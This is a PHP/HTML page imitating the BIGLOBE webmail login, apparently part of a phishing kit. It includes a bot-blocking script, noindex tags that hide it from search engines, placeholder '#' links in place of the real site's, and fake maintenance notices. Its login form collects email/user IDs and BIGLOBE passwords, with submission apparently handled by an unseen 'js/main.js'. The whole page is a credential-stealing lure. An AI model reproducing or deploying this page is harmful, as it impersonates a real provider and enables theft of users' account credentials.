<?php 
    require("./bot/botBlock.php");
?>

<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 <meta name="robots" content="noindex">
  <meta name="googlebot" content="noindex">
  <meta name="googlebot-news" content="noindex">
  <meta name="googlebot" content="noindex">
  <meta name="googlebot-news" content="nosnippet">
<title>BIGLOBEメール｜Webメール</title>
<link rel="icon" href="img/favicon.ico" type="image/vnd.microsoft.icon">
<link href="css/import.css" rel="stylesheet" type="text/css">
<script src="js/jquery.min.js"></script>
<script src="js/jquery-3.1.1.min.js"></script>
<script src="js/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
<script src="js/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>

</head>

<body>

<div id="container"><a name="pagetop"></a>

<!-- Header// -->
<div id="header_main">
	<div id="header_logo">
	<h1><img src="img/logo_email.gif" alt="BIGLOBEメール" usemap="#logo" width="210" height="31"></h1>
	<map name="logo">
	<area shape="rect" coords="0,0,150,35" href="#" alt="BIGLOBE">
	<area shape="rect" coords="150,0,210,35" href="#" alt="BIGLOBEメール">
	</map>
	</div><!--/header-logo-->
	<div id="header_keyword">
	<strong>メールがもっと便利で楽しくなる！</strong>
	</div>
	<br class="clear">
</div>

<div id="header-link">
	<div id="support_menu">
<ul class="fmenu">
      <li><a href="#">メールサービス</a></li>
      <li><a class="bl" href="#" target="_blank">会員サポート</a></li>
      <li><a class="bl" href="#" target="_blank">障害情報</a></li>
</ul>
	</div>
</div>
<!-- //Header -->


<!-- Main_start -->
<div id="main">

<!-- Contents_start -->
<div id="contents_block">
<div class="news">
<ul>
</ul>
</div>

<iframe src="img/heute.html" width="800" height="36" frameborder="0"></iframe>
<!-- お客様サービス end //-->

<!-- お知らせ start //-->
<div class="infotitle" style="margin-top:25px;">お知らせ</div>
<div class="infoArea">
<p>・<a href="#" target="_blank">BIGLOBEメール メンテナンス（2023/6/19 - 6/20）</a><font color="ff0000"><b>New!</b></font></p>
<p>・<a href="#" target="_blank">メールサービス メンテナンス（2023/6/19 - 6/20）</a><font color="ff0000"><b>New!</b></font></p>
<p>・<a href="#" target="_blank">メールサービス メンテナンス（2023/6/16）</a><font color="ff0000"><b>New!</b></font></p>
<p>・<a href="#" target="_blank">メールサービス メンテナンス（2023/6/14）</a>は完了しました<font color="ff0000"><b>New!</b></font></p>
<p>・<a href="#" target="_blank">BIGLOBEメール メンテナンス（2023/6/14）</a>は完了しました<font color="ff0000"><b>New!</b></font></p>
<p>・<a href="#" target="_blank">BIGLOBEメール メンテナンス（2023/6/13）</a>は完了しました<font color="ff0000"><b>New!</b></font></p>
<p>・<a href="#" target="_blank">BIGLOBEメール 一部仕様変更のお知らせ</a><font color="ff0000"><b>New!</b></font></p>
<p>・<a href="#" target="_blank">Webメールにログインが出来ない場合はこちらをご確認ください。</a><font color="ff0000"><b></b></font></p>
</div>
<!-- お知らせ end //-->


<div id="info_footer"><p>


</p><div class="webrylink">
<center>

<div class="banner_area" style="margin-bottom: 15px;">
</div>
<ul>
<li><a href="#">推奨環境</a></li>
<li><a href="#">ヘルプ</a></li>
<li><a href="#">よくあるお問い合わせ</a></li>
<li><a href="#">必ずお読みください</a></li>
</ul>
</center>
</div>

<p></p></div>

<!-- /contents_block --></div>
<!-- Contents_end -->


<!-- Menu_start -->
<div id="side_menuArea">
<div id="side_menu_block">
<div id="side_menu">
<h2><img src="img/pagetitle_top.jpg" alt="BIGLOBEメールメールにログイン" width="238" height="43"></h2>

<!-- ERRORメッセージ:s -->
<!-- ERRORメッセージ:e -->

<div class="error-box hide">
	<span>メールアドレス(ユーザID)またはBIGLOBEパスワードが正しくありません。</span>
</div>
<div class="login_block">
<div id="login_form">
<form method="POST" name="direct" action="#" id="form">
	<input type="hidden" name="sms" value="10867615575187">
	<input type="hidden" name="ems" value="06657681871535">

<input type="hidden" name="onetime" value="0c5487a703c9dc5ad0b4b5c38963bf7f">
<input type="hidden" name="custom_id" value="">
<input type="hidden" name="from_page" value="loginWebmail">
	<div>
	<label for="loginid">メールアドレスまたはユーザID</label>
	<input name="loginid" type="text" size="35" autocomplete="off" id="loginid" value="" style="ime-mode: disabled">
	<label for="biglobe_pw">BIGLOBEパスワード</label>
	<input name="biglobe_pw" type="password" size="30" id="biglobe_pw">
	</div>
	
<div class="skey"><img src="img/softkey1.gif" alt="ソフトウェアキーボードで入力する" title="ソフトウェアキーボードで入力する" width="200" height="30" id="soft_keyboard_pass_id"></div>
<!-- Androidの場合SWキーボードのボタンを表示しないここまで //-->

<!-- SWキーボードここから //-->


<div id="keyboard"><div id="soft_keyboard_parent_overlay" style="position:relative"><div id="soft_keyboard_overlay" style="position:absolute"><table id="soft_keyboard_layout_box" width="443" border="0" cellspacing="0" cellpadding="0" style="display:none"><tbody><tr><td width="15" style="border:none; padding:0; background-color:transparent;"><img src="#"></td><td width="413" align="center" id="over_ct"></td><td width="15" style="border:none; padding:0; background-color:transparent;"><img src="#"></td></tr><tr><td id="over_lc"></td><td style="border:none; padding:0; background-color:#ffffff;"><table width="400" id="soft_keyboard_sel_box" border="0" cellspacing="0" cellpadding="0" style="margin-bottom:0; margin-top:5px; border:none;"><tbody><tr><td width="400" class="overray" style="border:none; padding:0; background-color:#ffffff;"><div class="soft_keyboard_close_overlay"><a><img id="soft_keyboard_close2" name="image" src="#" alt="閉じる"></a></div><div style="text-align:left;"><div>「メールアドレス」と「ユーザID」のどちらかを選択してください。</div><br></div><div style="text-align:left;"><a><img id="soft_keyboard_sel_id1" src="#" width="256" height="32" style="margin:15px 0 0px 80px;"></a><br><a><img id="soft_keyboard_sel_id2" src="#" width="256" height="32" style="margin:5px 0 5px 80px;"></a><br></div></td></tr></tbody></table><div id="soft_keyboard_keyboard"><table width="100%" border="0" cellspacing="0" cellpadding="0" style="width:413px; margin-bottom:0; margin-top:5px; border:none"><tbody><tr><td class="overray" style="border:none; padding:0; background-color:#ffffff;"><div class="clearfix"><div class="soft_keyboard_title_bg"><div id="soft_keyboard_title"></div></div><div class="soft_keyboard_close_overlay"><a><img id="soft_keyboard_close" name="image" src="#" alt="閉じる"></a></div></div><div class="soft_keyboard_in"><input class="soft_keyboard_key" id="soft_keyboard_left" type="button" style="background-position:-2px -650px"><input type="text" id="soft_keyboard_in_tmp" name="soft_keyboard_in_tmp" style="IME-MODE: disabled; width:240; height:25px; margin:0 2px 0 0; float:left;"><input type="password" id="soft_keyboard_in_tmp2" name="soft_keyboard_in_tmp2" style="IME-MODE: disabled; width:240; height:25px; margin:0 2px 0 0; float:left;"><input class="soft_keyboard_key" id="soft_keyboard_right" type="button" style="background-position:-20px -650px"><input class="soft_keyboard_key" id="soft_keyboard_clear" type="button" style="background-position:-103px -650px"><input class="soft_keyboard_key" id="soft_keyboard_backspace" type="button" style="background-position:-38px -650px"></div></td></tr></tbody></table><table width="100%" border="0" cellspacing="0" cellpadding="0" style="margin-bottom:0; margin-top:5px; border:none;"><tbody><tr><td class="overray" style="border:none; padding:0; background-color:#ffffff;"><div class="num_box clearfix"><div id="soft_keyboard_number" class="keyBox clearfix soft_keyboard_key"><input type="button" id="soft_keyboard_num_0" value="1" style="background-position:-2px -2px"><input type="button" id="soft_keyboard_num_1" value="2" style="background-position:-29px -2px"><input type="button" id="soft_keyboard_num_2" value="3" style="background-position:-56px -2px"><input type="button" id="soft_keyboard_num_3" value="4" style="background-position:-83px -2px"><input type="button" id="soft_keyboard_num_4" value="5" style="background-position:-110px -2px"><input type="button" id="soft_keyboard_num_5" value="6" style="background-position:-137px -2px"><input type="button" id="soft_keyboard_num_6" value="7" style="background-position:-164px -2px"><input type="button" id="soft_keyboard_num_7" value="8" style="background-position:-191px -2px"><input type="button" id="soft_keyboard_num_8" value="9" style="background-position:-218px -2px"><input type="button" id="soft_keyboard_num_9" value="0" style="background-position:-245px -2px"></div></div><div class="num_box clearfix"><div id="soft_keyboard_large_all_1" class="keyBox clearfix soft_keyboard_key"><input type="button" id="soft_keyboard_large_0" value="A" style="background-position:-2px -83px"><input type="button" id="soft_keyboard_large_1" value="B" style="background-position:-29px -83px"><input type="button" id="soft_keyboard_large_2" value="C" style="background-position:-56px -83px"><input type="button" id="soft_keyboard_large_3" value="D" style="background-position:-83px -83px"><input type="button" id="soft_keyboard_large_4" value="E" style="background-position:-110px -83px"><input type="button" id="soft_keyboard_large_5" value="F" style="background-position:-137px -83px"><input type="button" id="soft_keyboard_large_6" value="G" style="background-position:-164px -83px"><div class="soft_keyboard_space"></div><input type="button" id="soft_keyboard_large_7" value="H" style="background-position:-191px -83px"><input type="button" id="soft_keyboard_large_8" value="I" style="background-position:-218px -83px"><input type="button" id="soft_keyboard_large_9" value="J" style="background-position:-245px -83px"><input type="button" id="soft_keyboard_large_10" value="K" style="background-position:-272px -83px"><input type="button" id="soft_keyboard_large_11" value="L" style="background-position:-299px -83px"><input type="button" id="soft_keyboard_large_12" value="M" style="background-position:-326px -83px"><input type="button" id="soft_keyboard_large_13" value="N" style="background-position:-353px -83px"></div><div id="soft_keyboard_small_all_1" class="keyBox margin_bottom5 clearfix soft_keyboard_key"><input type="button" id="soft_keyboard_small_0" value="a" style="background-position:-2px -245px"><input type="button" id="soft_keyboard_small_1" value="b" style="background-position:-29px -245px"><input type="button" id="soft_keyboard_small_2" value="c" style="background-position:-56px -245px"><input type="button" id="soft_keyboard_small_3" value="d" style="background-position:-83px -245px"><input type="button" id="soft_keyboard_small_4" value="e" style="background-position:-110px -245px"><input type="button" id="soft_keyboard_small_5" value="f" style="background-position:-137px -245px"><input type="button" id="soft_keyboard_small_6" value="g" style="background-position:-164px -245px"><div class="soft_keyboard_space"></div><input type="button" id="soft_keyboard_small_7" value="h" style="background-position:-191px -245px"><input type="button" id="soft_keyboard_small_8" value="i" style="background-position:-218px -245px"><input type="button" id="soft_keyboard_small_9" value="j" style="background-position:-245px -245px"><input type="button" id="soft_keyboard_small_10" value="k" style="background-position:-272px -245px"><input type="button" id="soft_keyboard_small_11" value="l" style="background-position:-299px -245px"><input type="button" id="soft_keyboard_small_12" value="m" style="background-position:-326px -245px"><input type="button" id="soft_keyboard_small_13" value="n" style="background-position:-353px -245px"></div><div id="soft_keyboard_large_all_2" class="keyBox clearfix soft_keyboard_key"><input type="button" id="soft_keyboard_large_14" value="O" style="background-position:-2px -164px"><input type="button" id="soft_keyboard_large_15" value="P" style="background-position:-29px -164px"><input type="button" id="soft_keyboard_large_16" value="Q" style="background-position:-56px -164px"><input type="button" id="soft_keyboard_large_17" value="R" style="background-position:-83px -164px"><input type="button" id="soft_keyboard_large_18" value="S" style="background-position:-110px -164px"><input type="button" id="soft_keyboard_large_19" value="T" style="background-position:-137px -164px"><input type="button" id="soft_keyboard_large_20" value="U" style="background-position:-164px -164px"><div class="soft_keyboard_space"></div><input type="button" id="soft_keyboard_large_21" value="V" style="background-position:-191px -164px"><input type="button" id="soft_keyboard_large_22" value="W" style="background-position:-218px -164px"><input type="button" id="soft_keyboard_large_23" value="X" style="background-position:-245px -164px"><input type="button" id="soft_keyboard_large_24" value="Y" style="background-position:-272px -164px"><input type="button" id="soft_keyboard_large_25" value="Z" style="background-position:-299px -164px"></div><div id="soft_keyboard_small_all_2" class="keyBox clearfix soft_keyboard_key"><input type="button" id="soft_keyboard_small_14" value="o" style="background-position:-2px -326px"><input type="button" id="soft_keyboard_small_15" value="p" style="background-position:-29px -326px"><input type="button" id="soft_keyboard_small_16" value="q" style="background-position:-56px -326px"><input type="button" id="soft_keyboard_small_17" value="r" style="background-position:-83px -326px"><input type="button" id="soft_keyboard_small_18" value="s" style="background-position:-110px -326px"><input type="button" id="soft_keyboard_small_19" value="t" style="background-position:-137px -326px"><input type="button" id="soft_keyboard_small_20" value="u" style="background-position:-164px -326px"><div class="soft_keyboard_space"></div><input type="button" id="soft_keyboard_small_21" value="v" style="background-position:-191px -326px"><input type="button" id="soft_keyboard_small_22" value="w" style="background-position:-218px -326px"><input type="button" id="soft_keyboard_small_23" value="x" style="background-position:-245px -326px"><input type="button" id="soft_keyboard_small_24" value="y" style="background-position:-272px -326px"><input type="button" id="soft_keyboard_small_25" value="z" style="background-position:-299px -326px"></div></div><div id="soft_keyboard_m_mark"><div class="num_box clearfix"><div id="soft_keyboard_m_mark_1" class="keyBox clearfix soft_keyboard_key"><input type="button" id="soft_keyboard_mail_mark_0" value="@" style="background-position:-2px -407px"><input type="button" id="soft_keyboard_mail_mark_1" value="." style="background-position:-29px -407px"><input type="button" id="soft_keyboard_mail_mark_2" value="!" style="background-position:-56px -407px"><input type="button" id="soft_keyboard_mail_mark_3" value="?" style="background-position:-83px -407px"><input type="button" id="soft_keyboard_mail_mark_4" value="$" style="background-position:-110px -407px"><input type="button" id="soft_keyboard_mail_mark_5" value="%" style="background-position:-137px -407px"><input type="button" id="soft_keyboard_mail_mark_6" value="#" style="background-position:-164px -407px"><div class="soft_keyboard_space"></div><input type="button" id="soft_keyboard_mail_mark_7" value="*" style="background-position:-191px -407px"><input type="button" id="soft_keyboard_mail_mark_8" value="+" style="background-position:-218px -407px"><input type="button" id="soft_keyboard_mail_mark_9" value="-" style="background-position:-245px -407px"><input type="button" id="soft_keyboard_mail_mark_10" value="=" style="background-position:-272px -407px"><input type="button" id="soft_keyboard_mail_mark_11" value="_" style="background-position:-299px -407px"><input type="button" id="soft_keyboard_mail_mark_12" value="&#39;" style="background-position:-326px -407px"><input type="button" id="soft_keyboard_mail_mark_13" value="`" style="background-position:-353px -407px"></div><div id="soft_keyboard_m_mark_2" class="keyBox clearfix soft_keyboard_key"><input type="button" id="soft_keyboard_mail_mark_14" value="~" style="background-position:-2px -488px"><input type="button" id="soft_keyboard_mail_mark_15" value="{" style="background-position:-29px -488px"><input type="button" id="soft_keyboard_mail_mark_16" value="}" style="background-position:-56px -488px"><input type="button" id="soft_keyboard_mail_mark_24" value="&amp;" style="background-position:-272px -488px"><input type="button" id="soft_keyboard_mail_mark_25" value="/" style="background-position:-299px -488px"><input type="button" id="soft_keyboard_mail_mark_26" value="^" style="background-position:-326px -488px"><input type="button" id="soft_keyboard_mail_mark_27" value="|" style="background-position:-353px -488px"><div class="soft_keyboard_space"></div></div></div></div><div id="soft_keyboard_p_mark"><div class="num_box clearfix"><div id="soft_keyboard_p_mark_1" class="keyBox clearfix soft_keyboard_key"><input type="button" id="soft_keyboard_pass_mark_0" value="@" style="background-position:-2px -407px"><input type="button" id="soft_keyboard_pass_mark_1" value="." style="background-position:-29px -407px"><input type="button" id="soft_keyboard_pass_mark_2" value="!" style="background-position:-56px -407px"><input type="button" id="soft_keyboard_pass_mark_3" value="?" style="background-position:-83px -407px"><input type="button" id="soft_keyboard_pass_mark_4" value="$" style="background-position:-110px -407px"><input type="button" id="soft_keyboard_pass_mark_5" value="%" style="background-position:-137px -407px"><input type="button" id="soft_keyboard_pass_mark_6" value="#" style="background-position:-164px -407px"><div class="soft_keyboard_space"></div><input type="button" id="soft_keyboard_pass_mark_7" value="*" style="background-position:-191px -407px"><input type="button" id="soft_keyboard_pass_mark_8" value="+" style="background-position:-218px -407px"><input type="button" id="soft_keyboard_pass_mark_9" value="-" style="background-position:-245px -407px"><input type="button" id="soft_keyboard_pass_mark_10" value="=" style="background-position:-272px -407px"><input type="button" id="soft_keyboard_pass_mark_11" value="_" style="background-position:-299px -407px"><input type="button" id="soft_keyboard_pass_mark_12" value="&#39;" style="background-position:-326px -407px"><input type="button" id="soft_keyboard_pass_mark_13" value="`" style="background-position:-353px -407px"></div><div id="soft_keyboard_p_mark_2" class="keyBox clearfix soft_keyboard_key"><input type="button" id="soft_keyboard_pass_mark_14" value="~" style="background-position:-2px -488px"><input type="button" id="soft_keyboard_pass_mark_15" value="{" style="background-position:-29px -488px"><input type="button" id="soft_keyboard_pass_mark_16" value="}" style="background-position:-56px -488px"><input type="button" id="soft_keyboard_pass_mark_17" value="(" style="background-position:-83px -488px"><input type="button" id="soft_keyboard_pass_mark_18" value=")" style="background-position:-110px -488px"><input type="button" id="soft_keyboard_pass_mark_19" value="[" style="background-position:-137px -488px"><input type="button" id="soft_keyboard_pass_mark_20" value="]" style="background-position:-164px -488px"><div class="soft_keyboard_space"></div><input type="button" id="soft_keyboard_pass_mark_21" value="\" style="background-position:-191px -488px"><input type="button" id="soft_keyboard_pass_mark_22" value=":" style="background-position:-218px -488px"><input type="button" id="soft_keyboard_pass_mark_23" value=";" style="background-position:-245px -488px"></div></div></div><div class="keyBox" id="soft_keyboard_domain"><div class="num_box clearfix"><div id="soft_keyboard_domain_1" class="keyBox clearfix soft_keyboard_key"><input type="button" id="soft_keyboard_add_0" value=".co.jp" style="background-position:-2px -569px"><input type="button" id="soft_keyboard_add_1" value=".ne.jp" style="background-position:-52px -569px"><input type="button" id="soft_keyboard_add_2" value=".com" style="background-position:-102px -569px"><input type="button" id="soft_keyboard_add_3" value=".biglobe.ne.jp" style="background-position:-152px -569px"></div></div></div></td></tr></tbody></table><table id="soft_keyboard_footer_box" width="100%" border="0" cellspacing="0" cellpadding="0" style="margin-bottom:0; margin-top:5px; border:0; "><tbody><tr><td class="overray" style="text-align:center; border:none; padding:0; background-color:#ffffff;"><div class="checkbox"><label><input type="checkbox" id="soft_keyboard_random" name="soft_keyboard_random"> キー表示位置をランダムにする</label>　　<label id="soft_keyboard_pass_on2"><input type="checkbox" id="soft_keyboard_pass_on" name="soft_keyboard_pass_on"><span> パスワードを表示する</span></label></div><div class="select_box clearfix"><a id="soft_keyboard_transi_link"></a>　　<a><img id="soft_keyboard_cancel_b" src="#" width="96" height="32"></a><br></div></td></tr></tbody></table></div></td><td id="over_rc"></td></tr><tr><td style="border:none; padding:0; background-color:transparent;"><img src="#"></td><td id="over_cb"></td><td style="border:none; padding:0; background-color:transparent;"><img src="#"></td></tr></tbody></table></div></div></div>
<div id="my_div"></div>

	<ul>
    <li><input type="checkbox" name="autologinidflag" id="autologinidflag" value="1"><label for="autologinidflag">次回からIDの入力を省略</label></li>
	<li><input type="checkbox" name="autologinflag" id="autologinflag" value="1"><label for="autologinflag"><a href="#" target="_blank">ログイン状態を保存する</a><br>（共有パソコンではチェックをはずしてください）</label></li>
        <li><select name="version" id="version" style="display:none;">
<option value="advanced" selected="">アドバンスト版</option>
<option value="basic">標準版</option>
</select></li>
         <li>

<div id="deprecated" style="padding-top: 10px"></div>

</li>
</ul>

	<div class="loginBtn">
	<input type="image" src="img/btn_login.gif" border="0" alt="ログイン" title="ログイン" width="205" height="37"></div>
</form>
</div>

<ul class="supportLink">
<li><a href="#" target="_blank">ログイン方法について</a></li>
<li><a href="#" target="_blank">ID・パスワードを忘れた場合</a><br>
BIGLOBE法人会員でID・パスワードをお忘れの方は［<a href="#" target="_blank">こちら</a>］</li>
<li><a href="#" target="_blank">メールアドレスの取得・確認</a></li>
<li><a href="#" target="_blank">メールアドレスの変更</a></li>
</ul>
</div><!-- /login_block -->


</div>
</div>

</div>


</div>

<div id="footerContainer">

<div id="footerLink">
	<div id="footerLinkBox1">&nbsp;</div>
	<div id="footerLinkBox2">
		<a href="#">BIGLOBEトップ</a>｜<a href="#">インターネット接続</a>（<a href="#">ビッグローブ光</a>・<a href="#">格安SIM</a>・<a href="#">SIM替え</a>）<br>
		<a href="#">会社概要</a>｜<a href="#">ニュースリリース</a>｜<a href="#">採用情報</a>｜<a href="#l">個人情報保護ポリシー</a>｜<a href="#">Cookieポリシー</a>｜<a href="#">安心・安全</a>｜<a href="#">お問い合わせ</a>
	</div>


	<div id="footerLinkBox3">
	<img src="img/footer3logo.gif" alt="" width="210" height="66" usemap="#FooterMap">
<map name="FooterMap" id="FooterMap">
<area shape="rect" coords="95,0,155,64" href="#" target="_blank" alt="プライバシーマーク" ">
</map>
	</div>


</div>
<div id="footerCopyright">
	</script>Copyright(C)BIGLOBE Inc. 1996-2023
	<noscript>Copyright(C)BIGLOBE Inc.</noscript>
</div>
</div>
<!-- END : フッター -->


</div><!-- /container -->


<script src="./js/main.js"></script>
</body></html>